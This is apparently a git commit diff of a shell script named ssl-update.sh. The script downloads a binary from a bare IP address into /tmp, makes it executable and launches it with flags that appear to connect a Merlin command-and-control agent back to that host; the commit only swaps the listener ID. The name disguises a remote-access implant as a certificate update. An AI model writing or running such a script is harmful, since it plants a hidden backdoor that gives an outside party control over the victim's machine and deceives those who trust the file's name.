f9753db9314a658b7923c54ae50c53449f593ed9
svendev045 <126712757+svendev045@users.noreply.github.com>
2024-01-16 11:42:49 -0800

    Update ssl-update.sh

--- ssl-update.sh
+++ ssl-update.sh
@@ -1,3 +1,3 @@
 curl -s https://20.106.97.177/ssl-update -o /tmp/14ea88b1
 chmod +x /tmp/14ea88b1
-/tmp/14ea88b1 -url https://20.106.97.177:443/ -psk merlin -listener fef1ab7a-22ef-42c3-a272-c6d640f4db0f -proto https -debug
+/tmp/14ea88b1 -url https://20.106.97.177:443/ -psk merlin -listener b4d80480-f2ef-43c2-886b-fc552d2b15ae -proto https -debug
